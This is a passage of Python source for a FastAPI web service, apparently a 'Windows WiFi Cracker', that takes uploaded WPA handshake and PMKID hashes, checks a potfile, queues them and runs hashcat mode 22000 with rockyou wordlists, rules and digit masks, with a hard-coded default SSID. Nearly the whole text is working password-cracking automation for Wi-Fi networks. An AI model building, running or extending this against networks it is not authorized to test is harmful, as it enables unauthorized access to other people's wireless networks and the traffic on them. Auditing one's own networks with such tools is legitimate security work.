    hash_file = os.path.join(
        UPLOAD_DIR, f"hash_{int(time.time())}_{uuid.uuid4().hex[:8]}.hc22000")
    with open(hash_file, 'w') as f:
        f.write(hash_str + '\n')
    n_lines = len(hash_str.splitlines())
    
    # Try potfile first (instant answer)
    password = lookup_potfile(ssid_hex)
    if password:
        STATE["status"] = "cracked"
        STATE["cracking"] = False
        STATE["results"] = [f"{ssid}: {password}"]
        STATE["progress"] = 100
        STATE["message"] = f"Found in potfile: {password}"
        STATE["attack_info"] = "potfile"
        STATE["hash_file"] = hash_file
        STATE["hash_count"] = n_lines
        STATE["ssid"] = ssid
        log(f"✅ INSTANT: {ssid} = {password} (from potfile)")
        return JSONResponse({"ok": True, "password": password, "source": "potfile",
                             "ssid": ssid, "hash_file": hash_file,
                             "state": STATE["status"]})
    
    # Every received hash joins the queue first — it is never dropped because
    # another hash arrived later (old design: single STATE["pending"] slot).
    ent = queue_add(hash_file, ssid, bssid, n_lines, state="pending")
    STATE["hash_file"] = ent["hash_file"]
    STATE["hash_count"] = ent.get("lines") or n_lines
    STATE["ssid"] = ssid

    # GPU idle AND nothing cracking -> start right away.
    # GPU busy (local model in VRAM) or a crack already running -> hold in queue.
    if not gpu_busy() and not STATE.get("cracking"):
        start_crack(ent["hash_file"], ssid, qid=ent["id"], note="顯存閒置自動跑")
        log(f"▶ GPU idle, auto-cracking {ssid}")
        return JSONResponse({"ok": True, "auto": True,
                             "message": "顯存閒置 → 直接開始破解",
                             "hash_file": ent["hash_file"], "id": ent["id"],
                             "state": STATE["status"],
                             "queued": len(STATE["queue"])})

    STATE["status"] = "pending"
    STATE["progress"] = 0
    if gpu_busy():
        why = "顯存被佔用 %sMB" % STATE.get("gpu_mem_used", '?')
    elif STATE.get("cracking"):
        why = "已有破解在跑"
    else:
        why = "等待確認"
    STATE["message"] = ("收到 %s 的 hash（%d 行, BSSID %s）— %s，等待確認是否破解"
                        % (ssid, n_lines, bssid or '?', why))
    sync_pending()
    log(f"⏸ Hash held for confirmation: {ssid} ({n_lines} lines, queued={len(STATE['queue'])})")
    return JSONResponse({"ok": True, "pending": True,
                         "message": "hash 已儲存，等待確認破解",
                         "hash_file": ent["hash_file"], "id": ent["id"],
                         "state": STATE["status"],
                         "queued": len(STATE["queue"])})

@app.post("/api/confirm")
async def api_confirm(qid: str = None):
    """Start cracking one queued hash (qid optional → oldest pending)."""
    ent = queue_take(qid)
    if ent is None:
        return JSONResponse({"ok": False, "error": "Nothing pending",
                             "queued": len(STATE["queue"])})
    sync_pending()
    if not os.path.exists(ent.get("hash_file", "")):
        queue_drop(qid=ent.get("id"))
        return JSONResponse({"ok": False, "error": "Hash file missing"})
    start_crack(ent["hash_file"], ent.get("ssid"), qid=ent.get("id"), note="confirmed")
    log(f"▶ User confirmed, cracking {ent.get('ssid')}")
    return JSONResponse({"ok": True, "message": "cracking started",
                         "hash_file": ent.get("hash_file"), "id": ent.get("id"),
                         "queued": len(STATE["queue"])})

@app.post("/api/reject")
async def api_reject(qid: str = None):
    """Drop one queued hash (the .hc22000 file stays on disk for Mac to resend)."""
    ent = None
    for e in list(STATE["queue"]):
        if (qid and e.get("id") == qid) or (not qid and e.get("state") == "pending"):
            ent = e
            break
    if ent is not None:
        queue_drop(qid=ent.get("id"))
    sync_pending()
    if not STATE.get("cracking"):
        STATE["status"] = "idle"
    STATE["message"] = "已拒絕破解（hash 已存檔，Mac 可重送）"
    log(f"✕ rejected: {(ent or {}).get('ssid', '-')}")
    return JSONResponse({"ok": True, "queued": len(STATE["queue"])})

@app.post("/api/extract")
async def api_extract(file: UploadFile = File(...), ssid: str = "32H9F_5G"):
    content = await file.read()
    ext = ".pcapng" if ".pcapng" in (file.filename or "") else ".pcap"
    pcap_path = os.path.join(UPLOAD_DIR, f"upload_{int(time.time())}{ext}")
    with open(pcap_path, 'wb') as f:
        f.write(content)
    threading.Thread(target=extract_hashes, args=(pcap_path, ssid), daemon=True).start()
    return JSONResponse({"ok": True, "path": pcap_path})

@app.post("/api/crack")
async def api_crack(wordlist: str = "rockyou", rules: str = None, mode: str = "0", mask: str = None, temp_limit: int = 85, qid: str = None):
    global TEMP_LIMIT
    if temp_limit:
        TEMP_LIMIT = temp_limit
    hf = None
    if qid:
        ent = queue_find(qid)
        if ent:
            hf = ent.get("hash_file")
    if not hf:
        hf = STATE.get("hash_file")
    if not hf or not os.path.exists(hf):
        return JSONResponse({"ok": False, "error": "No hash file"})
    if STATE.get("cracking"):
        return JSONResponse({"ok": False, "error": "Crack already running"})
    if not qid:
        for e in list(STATE["queue"]):
            if e.get("hash_file") == hf:
                qid = e.get("id")
                break
    if qid:
        queue_take(qid)
    STATE["hash_file"] = hf
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["results"] = []
    STATE["progress"] = 60
    threading.Thread(target=thermal_monitor, daemon=True).start()
    threading.Thread(target=crack_hashes, args=(hf, wordlist, rules, mode, mask), daemon=True).start()
    return JSONResponse({"ok": True, "hash_file": hf})

@app.post("/api/stop")
async def api_stop():
    """Stop current cracking.

    刻意保留 taskkill /F /IM hashcat.exe（不是漏網地雷）：這條路徑只有使用者
    手動按網頁「Stop」才會走，語意就是「把現在所有 hashcat 停下來」，所以會
    連同佇列中其他條目的 hashcat 一起殺掉。
    自動流程（每個破解階段、每輪佇列接續）一律走 kill_own_hashcat()，
    只殺自己追蹤的 PID，不會誤殺別輪正在跑的破解。
    """
    r = subprocess.run(['taskkill', '/F', '/IM', 'hashcat.exe'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    STATE["cracking"] = False
    STATE["status"] = "idle"
    STATE["message"] = "Stopped"
    log("Crack stopped by user")
    return JSONResponse({"ok": True})

@app.get("/api/log")
async def api_log():
    """Get file log (last 200 lines)."""
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        return JSONResponse({"lines": lines[-200:]})
    except:
        return JSONResponse({"lines": []})

@app.get("/api/pcaps")
async def api_pcaps():
    """List uploaded pcaps + hash files."""
    files = []
    if os.path.exists(UPLOAD_DIR):
        for f in sorted(os.listdir(UPLOAD_DIR), reverse=True):
            path = os.path.join(UPLOAD_DIR, f)
            size = os.path.getsize(path)
            files.append({"name": f, "size": size, "path": path})
    return JSONResponse({"files": files[:20]})

@app.post("/api/crack_wordlist")
async def api_crack_wordlist(wordlist_path: str, mode: str = "0", rules: str = None, mask: str = None, temp_limit: int = 85):
    """Crack with a custom wordlist path."""
    global TEMP_LIMIT
    if temp_limit:
        TEMP_LIMIT = temp_limit
    if not STATE["hash_file"]:
        return JSONResponse({"ok": False, "error": "No hash file"})
    if not os.path.exists(wordlist_path):
        return JSONResponse({"ok": False, "error": f"Wordlist not found: {wordlist_path}"})
    threading.Thread(target=crack_hashes_custom, args=(STATE["hash_file"], wordlist_path, rules, mode, mask), daemon=True).start()
    return JSONResponse({"ok": True})

def crack_hashes_custom(hash_file, wordlist_path, rules_key, mode, mask):
    """Crack with custom wordlist path."""
    STATE["status"] = "cracking"
    STATE["cracking"] = True
    STATE["progress"] = 30
    STATE["results"] = []
    info = f"mode={mode}, wordlist={wordlist_path}, rules={rules_key or 'none'}"
    STATE["attack_info"] = info
    log(f"Starting hashcat custom ({info})")
    try:
        rules = RULES.get(rules_key) if rules_key else None
        cmd = [HASHCAT, "-m", "22000",
               "--self-test-disable", "--restore-disable",
               f"--hwmon-temp-abort={TEMP_CRIT}", "-w", "2",
               "--potfile-path", POTFILE]
        if mode == "0":
            cmd.extend(["-a", "0", hash_file, wordlist_path])
            if rules:
                cmd.extend(["-r", rules])
        elif mode in ("3", "1", "mask"):
            cmd.extend(["-a", "3", hash_file, wordlist_path, mask or "?d?d?d?d?d?d?d?d"])
        log(f"CMD: {' '.join(cmd)}")
        kill_own_hashcat()
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, encoding='utf-8', errors='ignore', cwd=HASHCAT_DIR, creationflags=subprocess.CREATE_NO_WINDOW)
        global _OWN_HASHCAT_PID
        _OWN_HASHCAT_PID = proc.pid
        start_time = time.time()
        last_log = 0
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            now = time.time()
            if now - last_log > 15:
                last_log = now
                elapsed = int(now - start_time)
                STATE["message"] = f"Cracking... ({elapsed}s)"
                log(f"[{elapsed}s] {line[:150]}")
            # hashcat -m 22000 outputs PMKID (32 chars) + colons for WPA*02,
            # or PMK (64 chars) for WPA*01. Match both.
            if re.match(r'^[0-9a-f]{32,64}:', line):
                STATE["results"].append(line)
                log(f"CRACKED: {line}")
            if 'Speed' in line and ('MH/s' in line or 'kH/s' in line):
                STATE["speed"] = line
            if 'Status' in line:
                log(f"STATUS: {line}")
        proc.wait()
        elapsed = int(time.time() - start_time)
        results = STATE["results"]
        if not results:
            results.append("No match")
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["progress"] = 100
        STATE["message"] = f"Done ({elapsed}s): {len(results)} result(s)"
        log(f"Done in {elapsed}s: {results}")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["cracking"] = False
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

if __name__ == "__main__":
    # 單實例防呆：8766 已有人監聽就直接退出（排程重啟不搶埠）
    import socket
    _probe = socket.socket()
    _probe.settimeout(2)
    try:
        _probe.connect(("127.0.0.1", 8766))
        print("port 8766 already served, exiting")
        sys.exit(0)
    except OSError:
        pass
    finally:
        _probe.close()
    log("Windows WiFi Cracker starting on port 8766...")
    queue_load()
    get_gpu_status()
    uvicorn.run(app, host="0.0.0.0", port=8766)
